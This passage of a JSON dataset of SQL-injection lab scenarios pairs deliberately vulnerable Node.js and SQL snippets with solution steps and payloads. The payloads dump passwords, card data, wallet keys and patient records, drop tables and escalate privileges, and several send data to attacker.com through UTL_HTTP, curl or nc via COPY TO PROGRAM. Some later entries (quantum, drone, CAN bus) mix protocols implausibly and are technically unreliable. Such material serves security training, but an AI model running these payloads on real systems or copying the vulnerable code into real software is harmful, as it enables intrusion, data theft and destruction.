      "<![CDATA[' UNION SELECT xmlagg(XMLELEMENT(NAME \"data\", diagnosis)) FROM records--]]>",
      "'||UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT medical_history FROM patients))--"
    ]
  },
  {
    "Lab scenario": "Smart Home Dashboard – SQLi in Device Group Aggregation",
    "Lab Description": "The smart home admin dashboard allows users to aggregate device energy usage by group. The server-side logic dynamically builds the SQL `GROUP BY` and `ORDER BY` clauses based on user-supplied parameters. An attacker can exploit this by injecting a UNION-based payload through the group query, exfiltrating device secrets or configuration files. The vulnerability arises due to lack of input validation and direct string interpolation into SQL clauses. This mimics real-world attacks in IoT management platforms.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the `/device/stats?group=group_name` endpoint",
      "Inject: `1 UNION SELECT NULL, secret_key FROM device_configs--`",
      "Observe the leaked `secret_key` values in the response",
      "Automate using sqlmap with custom `--union-cols`"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/device/stats', (req, res) => {\n  const groupBy = req.query.group;\n  const query = `SELECT ${groupBy}, SUM(power_usage) FROM devices GROUP BY ${groupBy}`;\n  pool.query(query, (err, result) => {\n    if (err) return res.status(500).send(err.toString());\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "1 UNION SELECT NULL, secret_key FROM device_configs--",
      "1 UNION SELECT version(), NULL--"
    ]
  },
  {
    "Lab scenario": "Library Search Engine – SQLi via Boolean Conditions in Search Filter",
    "Lab Description": "A digital library platform allows users to search books using various filters including author and genre. The search input is vulnerable to Boolean-based blind SQL injection due to its dynamic usage in the `WHERE` clause without sanitization. By leveraging timing functions such as `pg_sleep` or `SLEEP`, an attacker can enumerate database content even when no output is directly returned. The challenge highlights data inference via blind channels and can simulate real-world research archive systems.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send POST request to `/search` with `{ \"filter\": \"author='Alice' AND 1=1\" }`",
      "Modify payload: `author='Alice' AND (SELECT CASE WHEN LENGTH((SELECT password FROM users LIMIT 1))>5 THEN pg_sleep(5) ELSE pg_sleep(0) END)--`",
      "Measure response delay to infer password length",
      "Automate extraction with a binary search loop"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/search', (req, res) => {\n  const filter = req.body.filter;\n  const query = `SELECT * FROM books WHERE ${filter}`;\n  pool.query(query, (err, result) => {\n    if (err) return res.status(500).send(\"Invalid filter\");\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "author='admin' AND 1=1--",
      "author='admin' AND (SELECT CASE WHEN 1=1 THEN pg_sleep(3) ELSE pg_sleep(0) END)--"
    ]
  },
  {
    "Lab scenario": "Insurance Claim Portal – SQLi in Policy ID Lookup",
    "Lab Description": "An insurance web portal allows users to track claim status by providing a policy ID. The policy ID is directly concatenated into a SQL `WHERE` clause without proper escaping. This enables classic SQL injection attacks, allowing attackers to enumerate policy details, retrieve confidential claim attachments, and bypass access controls. This scenario mimics legacy financial services APIs that rely on ID-based filtering.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit request to `/claims?policy_id=123`",
      "Inject: `123 OR 1=1--` to list all claims",
      "Use UNION to access additional tables: `123 UNION SELECT id, claimant_name, payout FROM sensitive_claims--`",
      "Dump sensitive data from the response"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/claims', (req, res) => {\n  const policyId = req.query.policy_id;\n  const query = `SELECT * FROM claims WHERE policy_id=${policyId}`;\n  pool.query(query, (err, result) => {\n    if (err) return res.status(400).send(\"Query failed\");\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "123 OR 1=1--",
      "123 UNION SELECT id, claimant_name, payout FROM sensitive_claims--"
    ]
  },
  {
    "Lab scenario": "Online Education Platform – SQLi via Feedback System",
    "Lab Description": "The course feedback system in a university's e-learning portal is vulnerable to stacked SQL injection. When students submit feedback, the comments are concatenated into a SQL statement used in administrative analysis reports. A malicious student can exploit this by submitting a comment that injects multiple SQL statements, enabling unauthorized access to staff tables or privilege escalation. The lab simulates real-world educational platforms that rely on weak report generators.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Register as a student and submit feedback",
      "Inject comment: `Nice course'; DROP TABLE students;--`",
      "Observe server-side error and dropped tables",
      "Refine payload for exfiltration: `Great!'; COPY users TO PROGRAM 'curl http://attacker.com/$(cat /etc/passwd)'--`"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/feedback', (req, res) => {\n  const comment = req.body.comment;\n  const courseId = req.body.course_id;\n  const query = `INSERT INTO feedback (course_id, comment) VALUES (${courseId}, '${comment}')`;\n  pool.query(query, (err, result) => {\n    if (err) return res.status(500).send(\"Failed to record feedback\");\n    res.send(\"Thank you for your feedback\");\n  });\n});",
    "payloads": [
      "Nice course'; DROP TABLE students;--",
      "Cool!'; COPY users TO PROGRAM 'curl http://attacker.com/$(whoami)'--"
    ]
  },
  {
    "Lab scenario": "Medical Record App – SQLi in Filtered Lab Test Results",
    "Lab Description": "A hospital management system provides an endpoint for querying lab test results filtered by test type. The SQL query uses the user input in a dynamic string with no validation, making it vulnerable to error-based SQL injection. The attacker can leverage PostgreSQL's error reporting to infer the structure of underlying tables and extract lab results or patient identifiers. This scenario is based on actual flaws seen in healthcare reporting interfaces.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Access `/results?test_type=blood`",
      "Inject: `blood' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--`",
      "Review server errors exposing schema names",
      "Use error leakage to extract fields like `ssn`, `diagnosis`, etc."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/results', (req, res) => {\n  const testType = req.query.test_type;\n  const query = `SELECT * FROM tests WHERE type='${testType}'`;\n  pool.query(query, (err, result) => {\n    if (err) return res.status(500).send(err.toString());\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "blood' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--",
      "urine' OR 1=1--"
    ]
  },
  {
    "Lab scenario": "Retail Chain API – SQLi via Internal Analytics Dashboard",
    "Lab Description": "A retail chain's internal dashboard accepts analytics queries via a web UI, where filter strings are passed to a SQL backend. Due to weak validation, attackers can inject time-based SQL payloads to exfiltrate sensitive inventory and sales data, especially when UNION-based methods are blocked. The attack vector uses PostgreSQL's `pg_sleep` and conditional subqueries, ideal for time-based inference.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit payload: `region='West' AND (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT name FROM products LIMIT 1),1,1))>77 THEN pg_sleep(5) ELSE pg_sleep(0) END)--`",
      "Measure response delays using curl and bash",
      "Extract product names character by character"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/analytics', (req, res) => {\n  const filter = req.body.filter;\n  const query = `SELECT * FROM analytics WHERE ${filter}`;\n  pool.query(query, (err, result) => {\n    if (err) return res.status(400).send(\"Bad filter\");\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "region='East' AND 1=1--",
      "region='West' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN pg_sleep(3) END)--"
    ]
  },
  {
    "Lab scenario": "University Login Panel – SQLi Bypass via Cookie Manipulation",
    "Lab Description": "The login system of a university portal relies on a user-supplied `auth_token` cookie, which is directly included in a SQL query. An attacker can forge the token to include a SQLi payload, bypassing authentication checks. This lab simulates real-world flaws in legacy systems where session data is not validated cryptographically.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Modify cookie: `auth_token=admin'--`",
      "Access restricted area via forged token",
      "Use UNION to fetch admin password hash: `admin' UNION SELECT password FROM users WHERE role='admin'--`"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/dashboard', (req, res) => {\n  const token = req.cookies.auth_token;\n  const query = `SELECT * FROM sessions WHERE token='${token}'`;\n  pool.query(query, (err, result) => {\n    if (err || result.rows.length === 0) return res.status(403).send(\"Access denied\");\n    res.send(\"Welcome back!\");\n  });\n});",
    "payloads": [
      "admin'--",
      "admin' UNION SELECT password FROM users WHERE username='admin'--"
    ]
  },
  {
    "Lab scenario": "Internal Admin Panel – SQLi in Role Assignment",
    "Lab Description": "An internal admin panel allows assigning roles to users through a vulnerable SQL query concatenated with user-controlled input. The input is directly passed to the SQL `UPDATE` query without proper sanitization. An attacker with limited access can escalate privileges by injecting into the role assignment input field. This scenario simulates a common misconfiguration where admin interfaces are assumed safe and are poorly validated.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Login as a low-privileged user with access to the role assignment interface",
      "Capture the POST request to `/admin/assign-role`",
      "Modify the `username` parameter to inject: `john'; UPDATE users SET role='admin' WHERE username='attacker`",
      "Observe successful privilege escalation by logging out and back in as `attacker`"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/admin/assign-role', (req, res) => {\n  const username = req.body.username;\n  const role = req.body.role;\n  const sql = `UPDATE users SET role='${role}' WHERE username='${username}'`;\n  db.query(sql, (err) => {\n    if (err) return res.status(500).send('Database error');\n    res.send('Role updated');\n  });\n});",
    "payloads": [
      "john'; UPDATE users SET role='admin' WHERE username='attacker",
      "admin'; DROP TABLE logs;--"
    ]
  },
  {
    "Lab scenario": "Payment History Portal – SQLi in Dynamic Column Filter",
    "Lab Description": "The application backend allows users to search their payment history by various columns like `amount`, `status`, or `method`. The filter column name is user-controlled and directly used in the SQL query, leading to a classic SQLi vulnerability through the `ORDER BY` clause. An attacker can exploit this to inject malicious SQL and dump the full transaction history or manipulate sorting logic.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture a GET request to `/payments?sort=amount`",
      "Inject payload: `1; SELECT version();--` in the `sort` parameter",
      "Use UNION-based injection to retrieve transaction secrets or configuration info",
      "Use pg_sleep for time-based confirmation if blind"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/payments', (req, res) => {\n  const sort = req.query.sort;\n  const sql = `SELECT * FROM transactions ORDER BY ${sort}`;\n  db.query(sql, (err, results) => {\n    if (err) return res.status(500).send('Query error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "amount; SELECT pg_sleep(5)--",
      "id; DROP TABLE transactions--"
    ]
  },
  {
    "Lab scenario": "NGO Donor Portal – SQLi via Search Field with LIKE",
    "Lab Description": "The NGO's donation search feature is vulnerable due to unsanitized use of user input in a `LIKE` clause. Attackers can inject SQL using special characters and extract sensitive donor information such as email addresses, donation amount, and messages. This is a common real-world vulnerability due to poor filter design in keyword searches.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send GET request: `/search?q=%' OR 1=1--`",
      "Use UNION to select data from `donors` table",
      "Use boolean-based blind SQLi to extract field-by-field info",
      "Automate the exploit using sqlmap"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/search', (req, res) => {\n  const q = req.query.q;\n  const sql = `SELECT * FROM donations WHERE message LIKE '%${q}%'`;\n  db.query(sql, (err, results) => {\n    if (err) return res.status(500).send('Search failed');\n    res.json(results);\n  });\n});",
    "payloads": [
      "%' OR 1=1--",
      "%' UNION SELECT null,email,null FROM donors--"
    ]
  },
  {
    "Lab scenario": "GraphQL Backend – SQL Injection in Resolver Function",
    "Lab Description": "A GraphQL resolver directly includes user input from a search query in the SQL statement, making it vulnerable to SQL injection. The injection point is in the GraphQL `searchProducts(term: String)` operation. Exploiting this can lead to arbitrary SQL execution and access to sensitive product inventory details.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Craft a GraphQL query with a malicious `term` parameter",
      "Inject: `'; DROP TABLE inventory;--` or UNION injections",
      "Send request via GraphQL playground or API client",
      "Retrieve sensitive data from inventory or logs"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const resolvers = {\n  Query: {\n    searchProducts: async (_, { term }) => {\n      const sql = `SELECT * FROM products WHERE name LIKE '%${term}%'`;\n      return await db.query(sql);\n    }\n  }\n};",
    "payloads": [
      "'; DROP TABLE inventory;--",
      "' UNION SELECT credit_card FROM payments--"
    ]
  },
  {
    "Lab scenario": "Travel Booking – SQLi in Country Filter with Enumeration",
    "Lab Description": "This application lets users filter travel packages by country. However, the country parameter is unsanitized and directly included in the SQL query. This allows attackers to enumerate packages in other users’ accounts by bypassing country-level access control using injection in the filter parameter.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send GET request to `/packages?country=Italy`",
      "Inject: `Italy' OR 1=1--` to bypass country filter",
      "Use UNION to join with customer table",
      "Dump names and emails using crafted payloads"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/packages', (req, res) => {\n  const country = req.query.country;\n  const sql = `SELECT * FROM travel_packages WHERE country='${country}'`;\n  db.query(sql, (err, rows) => {\n    if (err) res.status(500).send('Error fetching packages');\n    else res.json(rows);\n  });\n});",
    "payloads": [
      "Italy' OR 1=1--",
      "France' UNION SELECT name,email FROM users--"
    ]
  },
  {
    "Lab scenario": "Cloud Service – SQL Injection in API Key Authorization",
    "Lab Description": "A cloud service uses a weak implementation for API key lookup. It concatenates the `x-api-key` header value directly into a query. A malicious actor could modify the header and extract data from other tenants’ records or even bypass authentication altogether.",
    "Difficulty Level": "High",
    "Solution Steps": [
      "Send a GET request with crafted header: `x-api-key: key123' OR 1=1--`",
      "Access unauthorized resources via API response",
      "Test error-based injection to extract schema info",
      "Use time-based injection if output is blind"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/data', (req, res) => {\n  const apiKey = req.headers['x-api-key'];\n  const sql = `SELECT * FROM clients WHERE api_key='${apiKey}'`;\n  db.query(sql, (err, rows) => {\n    if (err) res.status(401).send('Invalid key');\n    else res.json(rows);\n  });\n});",
    "payloads": [
      "key123' OR 1=1--",
      "key123' UNION SELECT password FROM users--"
    ]
  },
  {
    "Lab scenario": "Employee Portal – SQL Injection in Login Field",
    "Lab Description": "The login form for internal employee authentication takes the username and password and embeds them directly into a SQL query. There is no use of prepared statements or sanitization, making it highly vulnerable. This classic injection can be used to bypass login and access internal records.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Enter `' OR '1'='1` as username and anything as password",
      "Observe login success without valid credentials",
      "Use UNION to extract employee emails from database"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/login', (req, res) => {\n  const user = req.body.username;\n  const pass = req.body.password;\n  const sql = `SELECT * FROM employees WHERE username='${user}' AND password='${pass}'`;\n  db.query(sql, (err, result) => {\n    if (result.length > 0) res.send('Welcome!');\n    else res.status(401).send('Unauthorized');\n  });\n});",
    "payloads": [
      "' OR '1'='1",
      "' UNION SELECT email FROM employees--"
    ]
  },
  {
    "Lab scenario": "Mobile API – SQL Injection in JSON Body Parameter",
    "Lab Description": "The mobile application sends JSON data containing search filters. The backend fails to validate or sanitize the `title` parameter in the JSON body. An attacker could send a malicious JSON payload to inject arbitrary SQL into the backend and retrieve internal documents.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send POST request: `{ \"title\": \"' OR 1=1--\" }`",
      "Use injection to list confidential documents",
      "Explore time-based and error-based techniques if needed"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/api/search', (req, res) => {\n  const title = req.body.title;\n  const sql = `SELECT * FROM docs WHERE title='${title}'`;\n  db.query(sql, (err, results) => {\n    if (err) return res.status(500).send('Search failed');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' OR 1=1--",
      "' UNION SELECT body FROM docs--"
    ]
  },
  {
    "Lab scenario": "Support Chat System – SQL Injection via Cookie Parameter",
    "Lab Description": "The application identifies users using a session cookie that is directly passed to a SQL query. If an attacker modifies the cookie value to include SQL, it can be used to retrieve or manipulate chat history, impersonate another user, or drop session tables.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture cookie `session_id=abc123` and modify to `abc123' OR '1'='1`",
      "Inject via Burp Suite or browser extension",
      "Observe chat history from multiple users returned"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/chats', (req, res) => {\n  const sessionId = req.cookies.session_id;\n  const sql = `SELECT * FROM messages WHERE session_id='${sessionId}'`;\n  db.query(sql, (err, messages) => {\n    if (err) return res.status(500).send('Chat fetch failed');\n    res.json(messages);\n  });\n});",
    "payloads": [
      "abc123' OR '1'='1",
      "xyz789' UNION SELECT content FROM logs--"
    ]
  },
  {
    "Lab scenario": "Banking API UNION-Based SQLi with Column Padding",
    "Lab Description": "A financial transactions API endpoint directly incorporates unsanitized user input into ORDER BY clauses of PostgreSQL queries. The application returns verbose errors containing full query syntax and database structure. Attackers can bypass column count restrictions through NULL padding and explicit type casting to extract SHA-256 hashed PIN codes from the accounts table. The vulnerability stems from debug-mode error handling in production and lack of parameterized queries.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Intercept GET /transactions?sort=date request using Burp Suite",
      "2. Determine column count: ' ORDER BY 7-- (observe error at ORDER BY 8)",
      "3. Identify string-compatible columns: ' UNION SELECT NULL,'test',NULL,NULL,NULL,NULL,NULL--",
      "4. Extract PIN hashes: ' UNION SELECT NULL,CAST(pin_hash AS TEXT),NULL,NULL,NULL,NULL,NULL FROM accounts--",
      "5. Bypass WAF using URL-encoded whitespace (%09 for tabs)",
      "6. Crack hashes using rainbow tables with banking-specific salts"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transactions', (req, res) => {\n  const sort = req.query.sort || 'id';\n  const query = `SELECT id, amount, date, recipient, status, currency, user_id\n    FROM transactions\n    ORDER BY ${sort}`;\n\n  pool.query(query, (err, result) => {\n    if(err) {\n      res.status(500).send(`Query failed: ${query}\\n${err.stack}`); // Critical debug leak\n    } else {\n      res.json(result.rows);\n    }\n  });\n});",
    "payloads": [
      "date UNION SELECT NULL,pg_read_file('/etc/passwd'),NULL,NULL,NULL,NULL,NULL--",
      "amount UNION SELECT NULL,current_setting('data_directory'),NULL,NULL,NULL,NULL,NULL--"
    ]
  },
  {
    "Lab scenario": "Medical Imaging System Error-Based SQLi in DICOM Metadata",
    "Lab Description": "A hospital PACS system improperly handles DICOM metadata fields in MySQL INSERT statements. PatientName tags (0010,0010) containing SQL fragments trigger type conversion errors that leak radiation therapy records through verbose database exceptions. Attackers can exfiltrate treatment plans containing sensitive Protected Health Information (PHI) by manipulating VR (Value Representation) fields.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Craft DICOM file with malformed PatientName: ' OR 1=CAST((SELECT treatment_plan FROM radiation LIMIT 1) AS UNSIGNED)--",
      "2. Upload via DICOM C-STORE protocol",
      "3. Extract treatment details from MySQL error messages",
      "4. Bypass DICOM validation using multi-value delimiters",
      "5. Automate extraction using recursive CTE queries"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/dicom-upload', (req, res) => {\n  const patientName = extractDICOMTag(req.file, '00100010');\n  const query = `INSERT INTO studies\n    (patient_name, modality, study_date)\n    VALUES ('${patientName.replace(/'/g, \",\")}', 'CT', NOW())`;\n\n  pool.query(query, (err) => {\n    res.send(err ? 'DICOM Error' : 'Upload Success');\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL,CONCAT(patient_id,':',treatment_date) FROM radiation--",
      "' AND (SELECT COUNT(*) FROM radiation WHERE dose > 5000)=1--"
    ]
  },
  {
    "Lab scenario": "Blockchain Oracle SQLi with Signature Bypass",
    "Lab Description": "A DeFi price oracle using EIP-712 signatures fails to validate query parameters in PostgreSQL. Attackers can forge signed requests to manipulate token prices through UNION injections in symbol parameterization. Vulnerability arises from improper separation of signing logic and SQL construction.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Reverse engineer EIP-712 type hash from contract ABI",
      "2. Craft UNION payload: 'ETH' UNION SELECT 1500.00 AS price--",
      "3. Generate valid signature using leaked nonce",
      "4. Bypass median calculation through Sybil nodes",
      "5. Execute flash loan arbitrage attacks"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/price', (req, res) => {\n  const { symbol, signature } = req.body;\n  const query = `SELECT price FROM ${symbol}_prices\n    WHERE block_number > 15438234`;\n\n  if (!validateSig(signature, query)) return res.status(403);\n  pool.query(query, (err, result) => {\n    res.json({ price: median(result.rows) });\n  });\n});",
    "payloads": [
      "ETH' UNION SELECT 1500.00 WHERE '1'='1'--",
      "BTC' AND (SELECT COUNT(*) FROM nodes)>=3--"
    ]
  },
  {
    "Lab scenario": "Industrial PLC Code Injection via Modbus",
    "Lab Description": "A PLC management interface processes Modbus FC23 messages with unsanitized register values in SQLite. Attackers can overwrite ladder logic through stacked queries containing CODESYS compiler commands. Vulnerability stems from mixing control logic storage with operational telemetry.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Capture Modbus/TCP traffic using Wireshark",
      "2. Forge register write: '; UPDATE plc_code SET program=readfile('/tmp/backdoor.st')--",
      "3. Bypass CRC using bitwise complement",
      "4. Trigger recompilation via dummy register write",
      "5. Verify backdoor installation"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "modbusServer.on('readWriteRegisters', (unit, reg, vals) => {\n  const value = vals.readFloatBE(0);\n  const query = `UPDATE iot_registers\n    SET value = ${value}\n    WHERE unit = ${unit} AND reg = ${reg}`;\n\n  db.run(query);\n});",
    "payloads": [
      "'; INSERT INTO plc_code VALUES ('malicious', x'4d5a')--",
      "'; SELECT load_extension('exploit.dll')--"
    ]
  },
  {
    "Lab scenario": "Telecom SS7 MAP Protocol SQLi",
    "Lab Description": "Mobile core network MAP interface improperly handles IMSI values in Oracle PL/SQL. Attackers can inject UNION payloads in UpdateLocation requests to exfiltrate subscriber SMS contents through SCCP routing bypass. Combines SS7 protocol weaknesses with dynamic SQL execution.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Spoof MAP UpdateLocation request",
      "2. Inject IMSI: ' UNION SELECT sms_text FROM inbox--",
      "3. Bypass SCCP GT translation",
      "4. Intercept SMS delivery reports",
      "5. Correlate TCAP transactions"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "CREATE PROCEDURE update_subscriber (\n  p_imsi VARCHAR2\n) IS\nBEGIN\n  EXECUTE IMMEDIATE 'SELECT msisdn FROM subs WHERE imsi='''||p_imsi||'''';\nEND;",
    "payloads": [
      "' UNION SELECT text FROM sms WHERE rownum=1--",
      "'||UTL_HTTP.REQUEST('http://attacker.com/'||location)--"
    ]
  },
  {
    "Lab scenario": "Smart Contract Metadata SQLi",
    "Lab Description": "NFT marketplace processes ERC-721 metadata with vulnerable JSONB queries in PostgreSQL. Attackers exploit JSON concatenation precedence to exfiltrate wallet keys through corrupted rarity scores. Vulnerability combines JSON operator precedence with lack of parameterization.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Mint NFT with malicious description",
      "2. Trigger rarity calculation job",
      "3. Exploit JSONB || operator precedence",
      "4. Extract hex-encoded private keys",
      "5. Convert to Ethereum addresses"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/calculate-rarity', (req, res) => {\n  const tokenId = req.body.id;\n  const query = `SELECT metadata->>'description' AS desc\n    FROM nfts WHERE token_id = ${tokenId}`;\n\n  pool.query(query, (err, result) => {\n    // Calculate rarity score\n  });\n});",
    "payloads": [
      "{\"description\":\"'||(SELECT ENCODE(private_key,'hex') FROM wallets)--\"}",
      "{\"attributes\":[{\"value\":\"'||(SELECT version())--\"}]}"
    ]
  },
  {
    "Lab scenario": "Drone Navigation SQLi via MAVLink",
    "Lab Description": "UAV ground control system processes MAVLink mission items with unsanitized parameters. Attackers inject coordinate updates through stacked queries to modify flight paths. Vulnerability stems from mixing navigation data storage with real-time control.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Spoof MAVLink system ID",
      "2. Forge MISSION_ITEM packet",
      "3. Bypass CRC via bitwise complement",
      "4. Override geofence coordinates",
      "5. Verify GPS spoofing"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "mavlinkServer.on('missionItem', (msg) => {\n  const query = `INSERT INTO flight_plan\n    (lat, lon) VALUES (${msg.x}, ${msg.y})`;\n  db.run(query);\n});",
    "payloads": [
      "35.6895); UPDATE waypoints SET lat=139.6917--",
      "0; ATTACH DATABASE '/dev/mem' AS mem--"
    ]
  },
  {
    "Lab scenario": "Quantum Circuit SQLi in QASM",
    "Lab Description": "Quantum compiler processes OpenQASM files with vulnerable creg names. Attackers inject SQL payloads to exfiltrate IBMQ credentials through transpilation errors. Combines quantum programming syntax with traditional SQLi.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Craft QASM with malicious creg",
      "2. Submit via Qiskit API",
      "3. Extract API keys from logs",
      "4. Bypass Unicode validation",
      "5. Hijack quantum compute time"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "def transpile(qasm):\n  name = extract_creg(qasm)\n  query = f\"SELECT mapping FROM layouts WHERE name='{name}'\"\n  db.execute(query);",
    "payloads": [
      "creg inject[8] = \"' UNION SELECT key FROM credentials--\"",
      "opaque gate \u200B' OR 1=1--"
    ]
  },
  {
    "Lab scenario": "Healthcare Radiology SQLi",
    "Lab Description": "Medical imaging system stores radiology notes in PostgreSQL with vulnerable plv8 functions. Attackers chain SQLi with JavaScript execution to leak DICOM files. Combines improper output encoding with excessive DB privileges.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Update notes with base64 payload",
      "2. Trigger report generation",
      "3. Exploit plv8.fetch()",
      "4. Bypass CSP via COPY PROGRAM",
      "5. Reconstruct DICOM files"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/save-notes', (req, res) => {\n  const notes = req.body.notes;\n  const query = `UPDATE reports SET notes='${notes}'\n    WHERE id=${req.params.id}`;\n\n  pool.query(query);\n});",
    "payloads": [
      "'; CREATE TEMP TABLE exfil AS SELECT encode(dicom,'base64') FROM images--",
      "'\\u0027; COPY (SELECT * FROM patients) TO PROGRAM 'nc attacker.com 4444'--"
    ]
  },
  {
    "Lab scenario": "Vehicle CAN Bus SQLi",
    "Lab Description": "Telematics system processes J1939 messages with unsanitized PIDs in SQLite. Attackers forge OBD-II packets to overwrite firmware hashes. Vulnerability arises from mixing diagnostic data with update logic.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Capture CAN traffic",
      "2. Forge J1939 message",
      "3. Overflow firmware buffer",
      "4. Bypass checksum",
      "5. Trigger malicious update"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "canBus.on('message', (msg) => {\n  const pid = msg.id.toString(16);\n  const query = `INSERT INTO can_logs\n    (pid, data) VALUES ('${pid}', '${msg.data}')`;\n  db.run(query);\n});",
    "payloads": [
      "7DF UNION SELECT NULL,hex(readfile('/etc/passwd'))--",
      "7E0; ATTACH DATABASE '/dev/mmcblk0' AS disk--"
    ]
  },
  {
    "Lab scenario": "DAO Governance SQLi",
    "Lab Description": "Decentralized organization uses vulnerable JSONB queries for Snapshot voting. Attackers manipulate delegation power through ENS record injections. Combines Web3 technologies with traditional SQLi.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Set malicious ENS text record",
      "2. Trigger strategy recalculation",
      "3. Exploit jsonb_to_recordset()",
      "4. Bypass EIP-712 validation",
      "5. Pass malicious proposals"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/voting-power', (req, res) => {\n  const query = `SELECT (metadata->'delegation')::jsonb\n    FROM ens WHERE name='${req.body.delegate}'`;\n  pool.query(query);\n});",
    "payloads": [
      "' OR 1=1; UPDATE voters SET weight=1000--",
      "'))); SELECT pg_sleep(10)--"
    ]
  },
  {
    "Lab scenario": "E-Commerce Product Filter SQL Injection via JSON Parameter",
    "Lab Description": "An e-commerce platform's product filtering API accepts JSON-formatted filter parameters that are directly concatenated into SQL WHERE clauses. The Node.js backend fails to validate array types, allowing attackers to bypass input sanitization and execute UNION-based injections. The PostgreSQL database returns full query errors in production, leaking column structures. To solve: Extract SHA-256 hashed admin credentials and credit card tokenization keys from the payment_gateway_config table while evading WAF rules using Unicode-encoded quotes.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept POST /api/filter-products request with Burp Suite",
      "Modify JSON payload: {\"price\": [\"0'\\u0020UNION\\u0020SELECT\\u0020NULL,key::text,NULL\\u0020FROM\\u0020payment_gateway_config--\"]}",
      "Bypass WAF using \\u0020 for whitespace and \\u0027 for apostrophes",
      "Identify VARCHAR-compatible columns through error analysis",
      "Decode Base64-encoded responses containing encrypted keys"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/api/filter-products', (req, res) => {\n  const filters = req.body\n    .map(f => `${f.field} = '${f.value}'`)\n    .join(' AND ');\n  const query = `SELECT id,name,price FROM products WHERE ${filters}`;\n  \n  pool.query(query, (err, result) => {\n    if(err) res.status(500).send(`Error: ${err.message}\\nQuery: ${query}`);\n    else res.json(result.rows);\n  });\n});",
    "payloads": [
      "{\"field\":\"price\",\"value\":\"0'\\u0020UNION\\u0020SELECT\\u00201,version(),3--\"}",
      "{\"field\":\"category\",\"value\":\"electronics'\\u0020AND\\u00201=CAST((SELECT\\u0020COUNT(*)\\u0020FROM\\u0020payment_gateway_config)\\u0020AS\\u0020INTEGER)--\"}"
    ]
  },
  {
    "Lab scenario": "Healthcare Patient Portal Boolean-Based Blind SQLi",
    "Lab Description": "A hospital patient portal uses unsanitized input in medication lookup queries. The Oracle backend suppresses errors but returns HTTP 200/404 status codes based on query validity. To solve: Determine sensitive patient allergy records through bitwise binary search of ASCII values using DBMS_PIPE packaged functions. The challenge requires precise timing analysis and evasion of request throttling mechanisms.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture POST /get-medications request with OWASP ZAP",
      "Identify boolean trigger: ' OR DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--",
      "Automate with sqlmap custom script using --eval=\"import base64\"",
